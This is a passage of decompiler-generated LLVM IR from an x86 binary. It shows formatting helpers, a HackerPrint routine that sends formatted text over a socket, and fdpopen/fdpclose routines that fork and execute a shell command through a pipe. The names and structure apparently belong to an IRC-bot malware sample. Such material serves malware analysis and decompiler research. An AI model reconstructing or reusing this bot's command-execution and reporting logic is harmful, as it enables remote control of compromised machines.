  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.152, %dec_label_pc_80487a5 ], [ %stack_var_12.152, %dec_label_pc_804876e ], [ %v1_804877a, %dec_label_pc_8048777 ], [ %v1_8048744, %dec_label_pc_8048741 ], [ %v1_804870b, %dec_label_pc_8048708 ], [ %v1_80486d2, %dec_label_pc_80486cf ], [ %v1_8048699, %dec_label_pc_8048696 ], [ %v1_804864e, %dec_label_pc_8048670 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_80487a5 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804876e ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048777 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048741 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048708 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80486cf ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048696 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048670 ]
  %stack_var_-28.0 = phi i32 [ %v4_80487be, %dec_label_pc_80487a5 ], [ %stack_var_-28.154, %dec_label_pc_804876e ], [ %v5_80487a0, %dec_label_pc_8048777 ], [ %v5_8048769, %dec_label_pc_8048741 ], [ %v5_8048730, %dec_label_pc_8048708 ], [ %v5_80486f7, %dec_label_pc_80486cf ], [ %v5_80486be, %dec_label_pc_8048696 ], [ %v5_8048685, %dec_label_pc_8048670 ]
  %v4_80487c1 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_80487c1 = add i32 %v4_80487c1, 1
  %stack_var_8.4 = inttoptr i32 %v5_80487c1 to i8*
  store i32 %v5_80487c1, i32* %eax.global-to-local, align 4
  %v2_80487c7 = load i8, i8* %stack_var_8.4, align 1
  %v3_80487c7 = zext i8 %v2_80487c7 to i32
  %v5_80487c7 = and i32 %v5_80487c1, -256
  %v6_80487c7 = or i32 %v3_80487c7, %v5_80487c7
  store i32 %v6_80487c7, i32* %eax.global-to-local, align 4
  %v4_80487c9 = icmp eq i8 %v2_80487c7, 0
  %v1_80487cb = icmp eq i1 %v4_80487c9, false
  br i1 %v1_80487cb, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80487d1:                             ; preds = %dec_label_pc_80487c1, %dec_label_pc_80485bb, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.154, %dec_label_pc_80485bb ], [ %stack_var_-28.0, %dec_label_pc_80487c1 ]
  %v4_80487d1 = icmp eq i32* %arg1, null
  br i1 %v4_80487d1, label %dec_label_pc_80487df, label %dec_label_pc_80487d7

dec_label_pc_80487d7:                             ; preds = %dec_label_pc_80487d1
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_80487da = load i32, i32* %arg1, align 4
  store i32 %v2_80487da, i32* %eax.global-to-local, align 4
  %v1_80487dc = inttoptr i32 %v2_80487da to i8*
  store i8 0, i8* %v1_80487dc, align 1
  br label %dec_label_pc_80487df

dec_label_pc_80487df:                             ; preds = %dec_label_pc_80487d1, %dec_label_pc_80487d7
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80487e2, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_80487c7, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_80487c1, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_8048656, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_8048633.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_8048630.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_80485fa, { 1, 2, 3, 0 }
  uselistorder i8* %v22_80485bb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.151, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.152, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in53, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.154, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_80487af, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 55, 56, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 40, 4, 5, 45, 46, 1, 0, 47, 48, 49, 50, 51, 52, 53, 54, 3, 2 }
  uselistorder i32 (i32)* @printi, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80487df, { 1, 0 }
  uselistorder label %dec_label_pc_80487c1, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_8048670, { 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048639, { 1, 0 }
  uselistorder label %dec_label_pc_80485fa, { 1, 0 }
  uselistorder label %dec_label_pc_80485ae, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v4_80487ed = ptrtoint i32* %stack_var_8 to i32
  %v4_80487fc = call i32 @print(i32* null, i32 %arg1, i32 %v4_80487ed)
  ret i32 %v4_80487fc
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804880f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048820 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804880f)
  ret i32 %v4_8048820
}

define i32 @HackerPrint(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v0_804882d = load i32, i32* @edi, align 4
  %v1_8048839 = call i32 @malloc(i32 2048)
  store i32 %v1_8048839, i32* %stack_var_-20, align 4
  %v3_8048855 = inttoptr i32 %v1_8048839 to i8*
  %v4_8048855 = call i32 @__GI_memset(i8* %v3_8048855, i32 0, i32 2048)
  %v4_8048866 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048878 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048866)
  %v3_8048891 = call i32 @_strlen(i8* %v3_8048855)
  %v6_8048898 = add i32 %v1_8048839, %v3_8048891
  %v1_804889b = inttoptr i32 %v6_8048898 to i8*
  store i8 10, i8* %v1_804889b, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_8048839, i32* @edi, align 4
  %v3_80488af = call i32 @_strlen(i8* %v3_8048855)
  %v4_80488c2 = call i32 @__libc_send(i32 %arg1, i32 %v1_8048839, i32 %v3_80488af, i32 16384)
  %v1_80488d3 = call i32 @free(i32 %v1_8048839)
  store i32 %v0_804882d, i32* @edi, align 4
  ret i32 %v4_80488c2

; uselistorder directives
  uselistorder i32 %v1_8048839, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen() local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e6 = load i32, i32* @edi, align 4
  store i32 %v0_80488e6, i32* %stack_var_-8, align 4
  %v4_80488ea = ptrtoint i8* %tmp24 to i32
  %v2_80488ed = load i8, i8* %tmp24, align 1
  %v10_80488ef = icmp eq i8 %v2_80488ed, 114
  br i1 %v10_80488ef, label %dec_label_pc_80488fc, label %dec_label_pc_80488f3

dec_label_pc_80488f3:                             ; preds = %entry
  %v2_80488f6 = load i8, i8* %tmp24, align 1
  %v10_80488f8 = icmp eq i8 %v2_80488f6, 119
  %v1_80488fa = icmp eq i1 %v10_80488f8, false
  br i1 %v1_80488fa, label %dec_label_pc_8048ad1, label %dec_label_pc_80488fc

dec_label_pc_80488fc:                             ; preds = %dec_label_pc_80488f3, %entry
  %v1_80488ff = add i32 %v4_80488ea, 1
  %v1_8048900 = inttoptr i32 %v1_80488ff to i8*
  %v2_8048900 = load i8, i8* %v1_8048900, align 1
  %v4_8048902 = icmp eq i8 %v2_8048900, 0
  br i1 %v4_8048902, label %dec_label_pc_8048912, label %dec_label_pc_8048ad1

dec_label_pc_8048912:                             ; preds = %dec_label_pc_80488fc
  %v2_8048915 = ptrtoint i32* %stack_var_-24 to i32
  %v1_8048919 = call i32 @__GI_pipe(i32 %v2_8048915)
  %v2_8048921 = icmp slt i32 %v1_8048919, 0
  %v1_8048923 = icmp eq i1 %v2_8048921, false
  br i1 %v1_8048923, label %dec_label_pc_8048931, label %dec_label_pc_8048ad1

dec_label_pc_8048931:                             ; preds = %dec_label_pc_8048912
  %v0_8048931 = load i8*, i8** @global_var_80614a0.13, align 4
  %v2_8048936 = icmp eq i8* %v0_8048931, null
  %v1_8048938 = icmp eq i1 %v2_8048936, false
  br i1 %v1_8048938, label %bb, label %dec_label_pc_804893a

dec_label_pc_804893a:                             ; preds = %dec_label_pc_8048931
  %v1_804893a = call i32 @getdtablesize(i32 %tmp23)
  %tmp37 = icmp slt i32 %v1_804893a, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048954, label %dec_label_pc_8048ad1

dec_label_pc_8048954:                             ; preds = %dec_label_pc_804893a
  %v2_8048957 = mul i32 %v1_804893a, 4
  %v1_804895e = call i32 @malloc(i32 %v2_8048957)
  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_80614a0.13, align 32
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v1_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v1_8048998 = call i32 @__vfork(i32 %tmp23)
  %v13_80489a6 = icmp eq i32 %v1_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v1_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805815a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058157.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8058154.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_80614a0.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v1_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_80614a0.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_80614a0.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_80614a0.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

